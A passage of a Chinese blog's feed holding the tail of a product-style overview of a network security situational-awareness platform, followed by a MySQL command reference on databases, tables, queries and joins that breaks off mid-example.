id="3-3-解决的安全问题">3.3. 解决的安全问题</h4><p>以下就安全态势感知与管控平台能够探知和发现的安全问题进行探讨。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\网络安全问题分层.png" style="zoom: 80%;" /><h5 id="3-3-1-网站安全">3.3.1 网站安全</h5><p>众所周知，网站是企业等单位的重要信息资产，网站的安全问题不仅关乎企业的网络安全问题，更重要的是如果其被随意篡改或者修改则会造成严重的政治问题或声誉问题。</p><p>安全态势感知与管控平台包含独有技术对网站的安全状况进行检查，其检查的范围主要包含针对网站漏洞的攻击或渗透行为、各种网站链接挂马行为、网页篡改行为以及其它针对网站的拒绝服务攻击、一般漏洞扫描等等。</p><h5 id="3-3-2-数据库安全">3.3.2 数据库安全</h5><p>除了网站以外，数据库是企业另一个特别重要的信息资产，数据库出现安全问题会对企业的信息安全工作以及日常工作产生毁灭性的打击，如 2018 年出现的XX酒店将关键数据库信息暴露在公网上（其数据库类型为 MySQL）而且密码极其简单，直接被一般黑客所破解，导致大量重要客户数据的信息泄露，对企业声誉造成了不可挽回的损失</p><h5 id="3-3-3-企业内网安全">3.3.3 企业内网安全</h5><p>包括北向安全以及东西向安全，因为经权威机构调研，信息安全的堡垒一般总是从内部被攻破的，这主要是存在如下原因：</p><ol><li><p>内部系统移动介质的滥用，导致各类僵尸、蠕虫以及木马等恶意软件的传播；</p></li><li><p>企业员工由于存在各种好奇心，会有意或无意地打开各类钓鱼邮件，从而导致其工作计算机沦陷；</p></li><li><p>企业员工在上网时，下载和安装了一些做过免杀处理的软件从而导致被种植了木马、矿机；</p></li><li><p>另外，企业员工在上网时，由于其系统没有及时更新相关软件，从而被直接渗透</p></li><li><p>最后，也不排除一些别有用心的员工故意在办公网或生产网传播恶意软件，从而导致企业信息安全的问题。</p></li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\内网安全.png" style="zoom:80%;" /><p>通过安全态势感知与管控平台可以充分发现南北向以及各类东西向安 全问题，包括诸如各类木马行为、隐蔽通道连接、勒索软件行为（含与服务器通讯以及横向传播）以及各类电子加密货币矿机行为，充分保障内部服务器及用户 终端的安全，避免造成各类损失。</p><h3 id="4-主要功能简介">4. 主要功能简介</h3><h4 id="4-1-对象失陷风险感知">4.1. 对象失陷风险感知</h4><p>在安全态势感知与管控平台中，对象不仅包含了各种形态的资产信息，还包括各类没有被纳入到资产的对象，这些对象可能是各类服务器或主机以及账 号或网站，故一般用户无需配置资产也可以对相关对象的失陷问题进行查看和处 理，这大大降低了初次使用本平台的门槛，也减轻了相关配置工作。 对象失陷的含义是相关主机、账号、网站等对象由于某些原因，如遭受鱼叉 攻击或水坑攻击而被植入各类木马、勒索软件以及蠕虫等恶意程序，从而产生相应的异常行为，导致重要数据被泄漏、重要文件被加密等；严重还会在内网（包括工作网络或生产网络等）肆意传播（横向传播）最终造成企业相关重要信息资产（不仅指有形资产还包括无形资产）的损失。</p><p>一般而言对象的失陷会包含探测、植入、回传、横向传播、收集数据以及数据外穿等若干阶段，如果在其中任意一环发现问题，则能够防止损失，评估对象失陷风险的感知是安全态势感知与管控平台的核心内容</p><h4 id="4-2-外部攻击威胁感知">4.2. 外部攻击威胁感知</h4><p>所谓外部威胁是指有外网主机或系统对内网的主机或系统发起的网络攻击或可能的非法连接及探测。</p><p>网络攻击一般是指攻击者利用受害者主机或系统存在的一些缺陷/漏洞或者 配置上的不足或者网络拓扑存在的问题，使用专用工具或手段对其进行探测、尝试、渗透，试图最终获得目标主机或系统的控制权，或者使受害者无法正常运行。</p><p>另外，可能的非法连接是指利用受害者主机或系统在某种情况下出现了不应暴露的端口，从而被非法入侵者所利用，如错误地将一些远程登录服务、数据库服务等暴露在公网环境。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\外部威胁感知.png" style="zoom:50%;" /><h4 id="4-3-外连攻击威胁感知">4.3.外连攻击威胁感知</h4><p>所谓外连威胁是指内网主机或系统对外网相关主机或系统发起的攻击或可疑连接，若存在此类威胁则说明内网主机可能存在失陷危险。</p><p>内网主机或系统的失陷原因可能存在多种可能，如因为从某些网站或服务器下载、安装了有害的程序或木马，或者被邮件钓鱼（如鱼叉攻击）诱使打开了危险邮件，或者插入移动介质而被感染了有害程序或木马，或者被内网其它主机所渗透而植入了有害程序；用户应特别重视此类危险；但也不排除内网有主机或系统主动发起了对外网的攻击。</p><p>从信息安全的角度而言，如果网络中出现外连攻击威胁，则其风险其实要较外部的攻击威胁更大，从而更应引起相关安全人员的注意。</p><h4 id="4-4-内部互连攻击威胁感知">4.4.内部互连攻击威胁感知</h4><p>所谓内部互连威胁是指有内网主机或系统对其它内网的主机或系统发起的网络攻击或可能的非法连接及探测。</p><p>内部互连攻击一般是指内网失陷主机对其它内网主机进行探测、尝试、渗透，试图最终获得目标主机或系统的控制权，从而在内网横向扩散、收集数据、破坏 系统。</p><p>其中，有一类为可能的非法连接是指利用受害者主机或系统在某种情况下出现了不应暴露的端口，从而被非法入侵者所利用，如错误地开放一些不应打开的端口。</p><h4 id="4-5-脆弱性感知">4.5.脆弱性感知</h4><p>脆弱性是一般是在部署时或运行时就自然存在于系统中的；系统运行的操作系统、应用软件均可能存在较为严重的脆弱性，另外错误或不当的配置也会造成系统存在脆弱性；</p><p>而安全态势感知与管控平台能够充分利用平台集成的相关工具对这些脆弱性进行主动的发现和提示，以防止用户由于不恰当的配置或者未能及时修补漏洞而造成的风险，从而导致出现口令被破解、漏洞（特别是网站资产）被利用 等安全事件的发生。</p><p>故脆弱性的感知也是“主动安全”的重要一环，可以做到防患于未然。</p><h4 id="4-6-云端综合安全感知">4.6.云端综合安全感知</h4><p>云端综合安全感知可以实时采集监控指标，提供及时有效的安全告警、响应，通过云端预警功能，根据不同行业和资产的系统类型，对可能存在的威胁，云端下发安全预警，线下及时排查和进行相关的安全防护。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\云端综合安全感知.png" style="zoom:50%;" /><h3 id="5-产品优势">5. 产品优势</h3><h4 id="5-1-全面感知">5.1.全面感知</h4><ul><li>全面嵌入各类安全信息感知模块，数据来源覆盖全面，包括网络流量、日志及各类脆弱性</li><li>全面感知各层面安全态势问题，包括网络安全态势、主机安全态势、数据安 全态势、应用安全态势、行为等</li><li>全面监控各方面安全态势问题，包括各类网络东西向安全问题、南北向安全问题、脆弱性问题等</li></ul><h4 id="5-2-精准解析">5.2.精准解析</h4><ul><li>利用网络流量分析探针，解析各类主流网络协议，如 HTTP、DNS、SMTP 等， 对相关元数据可进行查询和分析，无需单独接入其它设备日志</li><li>开放的自有标准化语法解析器，灵活度高、精确度高、快速自定义标准化解析</li><li>内置了大量的标准化脚本，适应各类主流设备和系统的精确解析</li></ul><h4 id="5-3-精确分析">5.3. 精确分析</h4><p>关联场景：基于统计和基于关联</p><ul><li>基于统计包含：平均统计、方差统计，支持按天、按周统计</li><li>基于关联包含：状态关联、时序关联、归并关联、筛选关联、端口关联、多维度关联</li><li>支持事件与基线关联分析、事件与漏洞关联分析、事件与事件关联分析智能行为分析</li><li>对多方向网络连接数据及其它用户异常行为自动进行基线分析，无需配置</li></ul><h4 id="5-4-展示丰富">5.4. 展示丰富</h4><ul><li>丰富的图形化展示：仪表板、业务拓扑图</li><li>用户自定义仪表板展现业务数据</li><li>实时监控：便于发现异常、随时挖掘分析</li><li>热图分布：追踪攻击来源，发现幕后黑手</li></ul><h4 id="5-5-体系完整">5.5. 体系完整</h4><ul><li>系统可选内置网络流量探针，无需第三方提供网络攻击威胁数据接入支持</li><li>系统内置了漏洞扫描、基线检查等模块，主动检查，及时加固</li><li>通过日志与漏洞等关联分析被动防御，发现威胁，抵御风险</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安全态势感知与管控平台&quot;&gt;安全态势感知与管控平台&lt;/h2&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;1-面临问题和挑战&quot;&gt;1. 面临问题和挑战&lt;/h3&gt;
&lt;h4 id=&quot;1-1-面临问题&quot;&gt;1.1. 面临问题&lt;/h4&gt;
&lt;p&gt;随着各类信息技术及软硬件系统的持续演</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="态势感知" scheme="https://shierjinghuang.github.io/tags/%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>数据库语法汇总</title>
    <link href="https://shierjinghuang.github.io/2023/08/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E6%B3%95%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2023/08/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E6%B3%95%E6%B1%87%E6%80%BB/</id>
    <published>2023-08-05T03:04:06.000Z</published>
    <updated>2025-04-05T14:03:40.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql-数据库操作命令">MySQL 数据库操作命令</h2><p>[TOC]</p><h3 id="1-数据库操作">1. 数据库操作</h3><p><strong>创建数据库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建数据库</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> database_name<span class="token punctuation">;</span><span class="token comment">-- 创建数据库并指定字符集</span><span class="token comment">-- 创建数据库时推荐使用 utf8mb4 字符集以支持完整的 Unicode 字符(包括emoji)</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> database_name <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8mb4 <span class="token keyword">COLLATE</span> utf8mb4_unicode_ci<span class="token punctuation">;</span><span class="token comment">-- 创建数据库(如果不存在)</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> database_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>修改数据库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 修改数据库字符集</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> database_name <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8mb4 <span class="token keyword">COLLATE</span> utf8mb4_unicode_ci<span class="token punctuation">;</span><span class="token comment">-- 重命名数据库(MySQL没有直接重命名数据库的命令，通常需要导出再导入)</span><span class="token comment">-- 替代方案：创建新数据库，迁移数据，删除旧数据库</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除数据库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 删除数据库</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> database_name<span class="token punctuation">;</span><span class="token comment">-- 删除数据库(如果存在)</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> database_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用数据库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 选择/使用数据库</span><span class="token keyword">USE</span> database_name<span class="token punctuation">;</span><span class="token comment">-- 查看当前使用的数据库</span><span class="token keyword">SELECT</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 查看所有数据库</span><span class="token keyword">SHOW</span> <span class="token keyword">DATABASES</span><span class="token punctuation">;</span><span class="token comment">-- 查看数据库创建语句</span><span class="token keyword">SHOW</span> <span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> database_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据库备份与恢复</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 备份数据库(命令行)</span>mysqldump -u username -p database_name <span class="token operator">></span> backup_file.sql<span class="token comment"># 恢复数据库(命令行)</span>mysql -u username -p database_name <span class="token operator">&lt;</span> backup_file.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-数据表操作">2. 数据表操作</h3><h4 id="2-1-创建数据表">2.1. 创建数据表</h4><blockquote><p>基本创建语法</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE TABLE 表名 (    -- 列名 数据类型 [约束条件]    列名1 数据类型 [约束条件] [COMMENT &#39;列注释&#39;],    列名2 数据类型 [约束条件] [COMMENT &#39;列注释&#39;],    ...    -- 表级约束（如主键、外键、唯一约束等）    [CONSTRAINT 约束名] 约束类型 (列名)) -- 表选项[ENGINE&#x3D;存储引擎] [DEFAULT CHARSET&#x3D;字符集] [COMMENT&#x3D;&#39;表注释&#39;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>完整创建示例</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE TABLE 表名 (    -- 列定义开始    id INT AUTO_INCREMENT,               -- 整数类型，自增长    username VARCHAR(50) NOT NULL,       -- 变长字符串，不能为空    password CHAR(60) NOT NULL,          -- 定长字符串，不能为空        -- 列约束示例    age INT UNSIGNED DEFAULT 18,         -- 无符号整数，默认值18    email VARCHAR(100) UNIQUE,           -- 唯一约束    balance DECIMAL(10,2) CHECK (balance &gt;&#x3D; 0),  -- 检查约束        -- 日期时间类型    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,           -- 默认当前时间    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, -- 自动更新        -- 表级约束（定义在所有列之后）    PRIMARY KEY (id),                    -- 主键约束    UNIQUE KEY uk_username (username),   -- 唯一键约束    INDEX idx_email (email),             -- 普通索引    FOREIGN KEY (role_id) REFERENCES roles(id) -- 外键约束)-- 表选项ENGINE&#x3D;InnoDB                          -- 存储引擎（默认InnoDB）DEFAULT CHARSET&#x3D;utf8mb4                -- 字符集（推荐utf8mb4支持emoji）COLLATE&#x3D;utf8mb4_unicode_ci             -- 排序规则COMMENT&#x3D;&#39;用户信息表&#39;;                  -- 表注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>列定义</strong>:</p><ul><li>格式：<code>列名 数据类型 [约束] [COMMENT '注释']</code></li><li>常用数据类型：INT, VARCHAR, CHAR, TEXT, DATE, TIMESTAMP, DECIMAL等</li><li>常用约束：NOT NULL, DEFAULT, UNIQUE, CHECK, AUTO_INCREMENT等</li></ul></li><li><p><strong>表级约束</strong>:</p><ul><li>主键：<code>PRIMARY KEY (列名)</code></li><li>外键：<code>FOREIGN KEY (列名) REFERENCES 外表名(列名)</code></li><li>索引：<code>INDEX 索引名 (列名)</code></li><li>唯一约束：<code>UNIQUE KEY 约束名 (列名)</code></li></ul></li><li><p><strong>表选项</strong>:</p><ul><li><code>ENGINE</code>：指定存储引擎（InnoDB/MyISAM等）</li><li><code>DEFAULT CHARSET</code>：设置默认字符集</li><li><code>COLLATE</code>：设置排序规则</li><li><code>COMMENT</code>：为表添加注释</li></ul></li><li><p><strong>注释方式</strong>:</p><ul><li>列注释：在列定义中使用 <code>COMMENT '注释内容'</code></li><li>表注释：在表选项中使用 <code>COMMENT='注释内容'</code></li></ul></li></ol><p><strong>从现有表创建新表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 只复制结构</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> new_table <span class="token operator">LIKE</span> original_table<span class="token punctuation">;</span><span class="token comment">-- 复制结构和数据</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> new_table <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> original_table<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-修改数据表">2.2. 修改数据表</h4><p><strong>添加列：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">ALTER TABLE table_name-- 修改指定表ADD COLUMN column_name datatype constraints;-- 添加新列（列名、数据类型、约束）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>修改列：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 修改列数据类型ALTER TABLE table_nameMODIFY COLUMN column_name new_datatype;-- 重命名列ALTER TABLE table_nameCHANGE COLUMN old_name new_name datatype;  -- 重命名列（必须指定数据类型）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除列：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">ALTER TABLE table_name DROP COLUMN column_name;  -- 删除指定列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>添加约束：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 添加主键ALTER TABLE table_nameADD PRIMARY KEY (column_name);  -- 将指定列设为主键-- 添加外键ALTER TABLE table_nameADD CONSTRAINT fk_name  -- 指定外键约束名称FOREIGN KEY (column_name) REFERENCES other_table(column_name);  -- 设置外键关系-- 添加唯一约束ALTER TABLE table_nameADD UNIQUE (column_name);  -- 使指定列的值唯一<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除约束：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 删除主键ALTER TABLE table_name DROP PRIMARY KEY;-- 删除外键ALTER TABLE table_name DROP FOREIGN KEY fk_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>重命名表：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 方法1RENAME TABLE old_name TO new_name;  -- 重命名表-- 方法2ALTER TABLE old_name RENAME TO new_name;  -- 重命名表的另一种方式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-删除数据表">2.3. 删除数据表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 删除表</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table_name<span class="token punctuation">;</span><span class="token comment">-- 删除表(如果存在)</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> table_name<span class="token punctuation">;</span><span class="token comment">-- 截断表(删除所有数据但保留结构)</span><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-使用数据表">2.4. 使用数据表</h4><p><strong>查看表信息：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SHOW TABLES;  -- 显示当前数据库中的所有表DESCRIBE table_name;  -- 显示表结构（列名、类型、约束等）DESC table_name;  -- DESCRIBE的简写形式SHOW COLUMNS FROM table_name;  -- 显示表列的另一种方式SHOW CREATE TABLE table_name;  -- 显示创建该表的完整SQL语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>表数据操作：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 插入数据INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...);-- 查询数据SELECT * FROM table_name;-- 更新数据UPDATE table_name SET column1 &#x3D; value1, column2 &#x3D; value2 WHERE condition;-- 删除数据DELETE FROM table_name WHERE condition;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>索引操作：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 创建索引CREATE INDEX index_name ON table_name (column_name);-- 创建唯一索引CREATE UNIQUE INDEX index_name ON table_name (column_name);-- 删除索引DROP INDEX index_name ON table_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-5-实用技巧">2.5. 实用技巧</h4><p><strong>复制表结构及数据：</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> new_table <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> original_table<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>快速清空并重置自增ID：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">TRUNCATE TABLE table_name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>添加注释：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 表注释ALTER TABLE table_name COMMENT &#39;表注释内容&#39;;-- 列注释ALTER TABLE table_name MODIFY COLUMN column_name datatype COMMENT &#39;列注释内容&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-查询操作">3. 查询操作</h3><h4 id="3-1-单表查询">3.1. 单表查询</h4><p><strong>基本查询</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 查询表中所有列的所有数据SELECT * FROM table_name;-- 仅查询表中的特定列SELECT column1, column2 FROM table_name;-- 为查询结果的列设置别名（便于理解和展示）SELECT column1 AS &#39;列1别名&#39;, column2 AS &#39;列2别名&#39; FROM table_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>条件查询</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 基础条件查询（condition可以是任何有效的条件表达式）SELECT * FROM table_name WHERE column1 &#x3D; &#39;value&#39;;-- 多条件AND查询（必须同时满足所有条件）SELECT * FROM table_name WHERE condition1 AND condition2;-- 多条件OR查询（满足任一条件即可）SELECT * FROM table_name WHERE condition1 OR condition2;-- 范围查询（包含边界值）SELECT * FROM table_name WHERE column BETWEEN value1 AND value2;-- IN查询（检查列值是否在指定列表中）SELECT * FROM table_name WHERE column IN (&#39;value1&#39;, &#39;value2&#39;, &#39;value3&#39;);-- LIKE模糊查询（%表示任意多个字符，_表示单个字符）SELECT * FROM table_name WHERE column LIKE &#39;张%&#39;;  -- 查找以&quot;张&quot;开头的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>排序查询</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 单列排序（ASC升序-默认，DESC降序）SELECT * FROM table_name ORDER BY column1 DESC;-- 多列排序（先按column1排序，相同值再按column2排序）SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分页查询</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 传统LIMIT分页（offset从0开始，count表示每页数量）SELECT * FROM table_name LIMIT 10, 20;  -- 跳过前10条，返回接下来的20条-- 现代分页写法（语义更明确）SELECT * FROM table_name LIMIT 20 OFFSET 10;  -- 同上，跳过10条取20条<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-分组查询">3.2. 分组查询</h4><p><strong>基本分组</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 按单列分组并计算每组的记录数SELECT department, COUNT(*) AS &#39;员工数量&#39; FROM employees GROUP BY department;-- 按多列分组（复合分组）SELECT department, gender, COUNT(*) FROM employees GROUP BY department, gender;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分组后过滤</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- HAVING用于对分组结果进行过滤（WHERE是对原始数据过滤）SELECT department, COUNT(*) as emp_count FROM employees GROUP BY department HAVING emp_count &gt; 5;  -- 只显示员工数大于5的部门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>聚合函数</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 常用聚合函数示例</span><span class="token keyword">SELECT</span>     <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'总记录数'</span><span class="token punctuation">,</span>    <span class="token function">SUM</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'薪资总额'</span><span class="token punctuation">,</span>    <span class="token function">AVG</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'平均薪资'</span><span class="token punctuation">,</span>    <span class="token function">MAX</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'最高薪资'</span><span class="token punctuation">,</span>    <span class="token function">MIN</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'最低薪资'</span><span class="token keyword">FROM</span> employees<span class="token punctuation">;</span><span class="token comment">-- 分组聚合（计算每个部门的平均薪资）</span><span class="token keyword">SELECT</span> department<span class="token punctuation">,</span> <span class="token function">AVG</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'部门平均薪资'</span><span class="token keyword">FROM</span> employees <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> department<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-3-连接查询">3.3. 连接查询</h4><p><strong>内连接 (INNER JOIN)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 基本内连接（只返回两表中匹配的行）SELECT e.name, d.department_name FROM employees eINNER JOIN departments d ON e.dept_id &#x3D; d.id;-- 多表内连接（连接三个表）SELECT o.order_id, c.customer_name, p.product_nameFROM orders oINNER JOIN customers c ON o.customer_id &#x3D; c.idINNER JOIN products p ON o.product_id &#x3D; p.id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>外连接</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 左外连接（返回左表所有行，右表无匹配则为NULL）SELECT e.name, d.department_name FROM employees e LEFT JOIN departments d ON e.dept_id &#x3D; d.id;-- 右外连接（返回右表所有行，左表无匹配则为NULL）SELECT e.name, d.department_name FROM employees e RIGHT JOIN departments d ON e.dept_id &#x3D; d.id;-- 全外连接模拟（MySQL没有FULL JOIN，用UNION实现）SELECT e.name, d.department_name FROM employees e LEFT JOIN departments d ON e.dept_id &#x3D; d.id UNION SELECT e.name, d.department_name FROM employees e RIGHT JOIN departments d ON e.dept_id &#x3D; d.id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>交叉连接 (CROSS JOIN)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 显式交叉连接（返回两表的笛卡尔积）SELECT p.product_name, s.size_name FROM products p CROSS JOIN sizes s;-- 隐式交叉连接（不推荐使用，不易读）SELECT p.product_name, s.size_name FROM products p, sizes s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>自连接</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 自连接示例：查找员工及其经理（同一表内连接）SELECT e1.name AS &#39;员工姓名&#39;, e2.name AS &#39;经理姓名&#39;FROM employees e1LEFT JOIN employees e2 ON e1.manager_id &#x3D; e2.id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-4-嵌套查询-子查询">3.4. 嵌套查询 (子查询)</h4><p><strong>WHERE子句中的子查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 单行子查询（子查询返回单行单列）</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token 